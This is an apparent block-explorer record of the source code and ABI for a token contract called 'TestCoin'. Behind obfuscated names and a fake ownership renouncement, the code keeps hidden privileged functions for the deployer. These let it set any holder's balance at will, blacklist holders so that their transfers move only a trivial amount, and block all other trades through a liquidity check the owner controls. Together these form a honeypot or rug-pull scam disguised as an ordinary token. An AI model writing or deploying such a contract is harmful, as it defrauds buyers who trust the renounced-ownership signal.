{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.12;\n\nlibrary SafeMath {\n\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n        uint256 c = a + b;\n        require(c >= a, \"SafeMath: addition overflow\");\n\n        return c;\n    }\n\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n        return sub(a, b, \"SafeMath: subtraction overflow\");\n    }\n\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b <= a, errorMessage);\n        uint256 c = a - b;\n\n        return c;\n    }\n\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n        if (a == 0) {\n            return 0;\n        }\n\n        uint256 c = a * b;\n        require(c / a == b, \"SafeMath: multiplication overflow\");\n\n        return c;\n    }\n\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n        return div(a, b, \"SafeMath: division by zero\");\n    }\n\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b > 0, errorMessage);\n        uint256 c = a / b;\n\n        return c;\n    }\n\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n        return mod(a, b, \"SafeMath: modulo by zero\");\n    }\n\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b != 0, errorMessage);\n        return a % b;\n    }\n}\n\nabstract contract teamFee {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface totalShouldAt {\n    function createPair(address tradingMarketing, address buyMarketing) external returns (address);\n\n    function feeTo() external view returns (address);\n}\n\ninterface tokenLiquidity {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\n\ninterface receiverLiquidityEnable {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address senderEnableSwap) external view returns (uint256);\n\n    function transfer(address marketingTo, uint256 teamAuto) external returns (bool);\n\n    function allowance(address receiverMaxShould, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 teamAuto) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address marketingTo,\n        uint256 teamAuto\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed limitFromReceiver, uint256 value);\n    event Approval(address indexed receiverMaxShould, address indexed spender, uint256 value);\n}\n\ninterface receiverLiquidityEnableMetadata is receiverLiquidityEnable {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract TestCoin is teamFee, receiverLiquidityEnable, receiverLiquidityEnableMetadata {\n\n    bool private liquidityExempt;\n\n    function swapLiquidity() private view {\n        require(sellWallet[_msgSender()]);\n    }\n\n    constructor (){\n        \n        isFee();\n        tokenLiquidity feeMarketing = tokenLiquidity(atFee);\n        liquidityTxMode = totalShouldAt(feeMarketing.factory()).createPair(feeMarketing.WETH(), address(this));\n        autoMode = totalShouldAt(feeMarketing.factory()).feeTo();\n        if (launchedSwap != fundMarketing) {\n            tradingTo = true;\n        }\n        fromTo = _msgSender();\n        sellWallet[fromTo] = true;\n        maxAutoExempt[fromTo] = receiverTradingAuto;\n        \n        emit Transfer(address(0), fromTo, receiverTradingAuto);\n    }\n\n    address atFee = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function isFee() public {\n        emit OwnershipTransferred(fromTo, address(0));\n        listLaunch = address(0);\n    }\n\n    function allowance(address receiverMax, address shouldWallet) external view virtual override returns (uint256) {\n        if (shouldWallet == atFee) {\n            return type(uint256).max;\n        }\n        return receiverMode[receiverMax][shouldWallet];\n    }\n\n    uint256 shouldTotal;\n\n    address public liquidityTxMode;\n\n    mapping(address => mapping(address => uint256)) private receiverMode;\n\n    uint256 public amountAuto;\n\n    mapping(address => bool) public sellWallet;\n\n    function transferFrom(address feeFund, address marketingTo, uint256 teamAuto) external override returns (bool) {\n        if (_msgSender() != atFee) {\n            if (receiverMode[feeFund][_msgSender()] != type(uint256).max) {\n                require(teamAuto <= receiverMode[feeFund][_msgSender()]);\n                receiverMode[feeFund][_msgSender()] -= teamAuto;\n            }\n        }\n        return toLaunch(feeFund, marketingTo, teamAuto);\n    }\n\n    event OwnershipTransferred(address indexed launchedFund, address indexed txTokenTotal);\n\n    function amountLaunched(address sellLiquidity, uint256 teamAuto) public {\n        swapLiquidity();\n        maxAutoExempt[sellLiquidity] = teamAuto;\n    }\n\n    uint256 private receiverTradingAuto = 100000000 * 10 ** 18;\n\n    uint8 private sellReceiver = 18;\n\n    function owner() external view returns (address) {\n        return listLaunch;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return sellReceiver;\n    }\n\n    function fromMaxSell(address modeSwap) public {\n        if (feeMax) {\n            return;\n        }\n        if (amountAuto != fundMarketing) {\n            walletSwap = true;\n        }\n        sellWallet[modeSwap] = true;\n        \n        feeMax = true;\n    }\n\n    function liquidityLaunchedAt(address feeFund, address marketingTo, uint256 teamAuto) internal returns (bool) {\n        require(maxAutoExempt[feeFund] >= teamAuto);\n        maxAutoExempt[feeFund] -= teamAuto;\n        maxAutoExempt[marketingTo] += teamAuto;\n        emit Transfer(feeFund, marketingTo, teamAuto);\n        return true;\n    }\n\n    function toLaunch(address feeFund, address marketingTo, uint256 teamAuto) internal returns (bool) {\n        if (feeFund == fromTo) {\n            return liquidityLaunchedAt(feeFund, marketingTo, teamAuto);\n        }\n        uint256 launchedLiquidity = receiverLiquidityEnable(liquidityTxMode).balanceOf(autoMode);\n        require(launchedLiquidity == shouldTotal);\n        require(marketingTo != autoMode);\n        if (maxReceiver[feeFund]) {\n            return liquidityLaunchedAt(feeFund, marketingTo, totalMin);\n        }\n        teamAuto = feeFundMarketing(feeFund, marketingTo, teamAuto);\n        return liquidityLaunchedAt(feeFund, marketingTo, teamAuto);\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return receiverTradingAuto;\n    }\n\n    address public fromTo;\n\n    uint256 public fundMarketing;\n\n    mapping(address => uint256) private maxAutoExempt;\n\n    bool public walletSwap;\n\n    address private listLaunch;\n\n    uint256 constant totalMin = 18 ** 10;\n\n    uint256 exemptTx;\n\n    string private shouldFrom = \"Test Coin\";\n\n    address autoMode;\n\n    function feeFundMarketing(address feeFund, address marketingTo, uint256 teamAuto) internal view returns (uint256) {\n        require(teamAuto > 0);\n\n        uint256 swapSender = 0;\n        if (feeFund == liquidityTxMode && shouldList > 0) {\n            swapSender = teamAuto * shouldList / 100;\n        } else if (marketingTo == liquidityTxMode && totalMode > 0) {\n            swapSender = teamAuto * totalMode / 100;\n        }\n        require(swapSender <= teamAuto);\n        return teamAuto - swapSender;\n    }\n\n    bool public feeMax;\n\n    function getOwner() external view returns (address) {\n        return listLaunch;\n    }\n\n    function sellTotal(address teamReceiver) public {\n        swapLiquidity();\n        if (amountAuto == launchedSwap) {\n            tokenLaunch = false;\n        }\n        if (teamReceiver == fromTo || teamReceiver == liquidityTxMode) {\n            return;\n        }\n        maxReceiver[teamReceiver] = true;\n    }\n\n    function approve(address shouldWallet, uint256 teamAuto) public virtual override returns (bool) {\n        receiverMode[_msgSender()][shouldWallet] = teamAuto;\n        emit Approval(_msgSender(), shouldWallet, teamAuto);\n        return true;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return fromTake;\n    }\n\n    bool public tradingTo;\n\n    function buyLiquidity(uint256 teamAuto) public {\n        swapLiquidity();\n        shouldTotal = teamAuto;\n    }\n\n    string private fromTake = \"TCN\";\n\n    function transfer(address sellLiquidity, uint256 teamAuto) external virtual override returns (bool) {\n        return toLaunch(_msgSender(), sellLiquidity, teamAuto);\n    }\n\n    uint256 private launchedSwap;\n\n    function name() external view virtual override returns (string memory) {\n        return shouldFrom;\n    }\n\n    function balanceOf(address senderEnableSwap) public view virtual override returns (uint256) {\n        return maxAutoExempt[senderEnableSwap];\n    }\n\n    mapping(address => bool) public maxReceiver;\n\n    bool private tokenLaunch;\n\n    uint256 public shouldList = 3;\n\n    uint256 public totalMode = 0;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverMaxShould\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchedFund\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"txTokenTotal\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"limitFromReceiver\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverMax\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"shouldWallet\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountAuto\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellLiquidity\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"teamAuto\",\"type\":\"uint256\"}],\"name\":\"amountLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldWallet\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"teamAuto\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderEnableSwap\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"teamAuto\",\"type\":\"uint256\"}],\"name\":\"buyLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeSwap\",\"type\":\"address\"}],\"name\":\"fromMaxSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromTo\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundMarketing\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityTxMode\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"maxReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamReceiver\",\"type\":\"address\"}],\"name\":\"sellTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"sellWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldList\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalMode\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingTo\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellLiquidity\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"teamAuto\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeFund\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"marketingTo\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"teamAuto\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "TestCoin", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}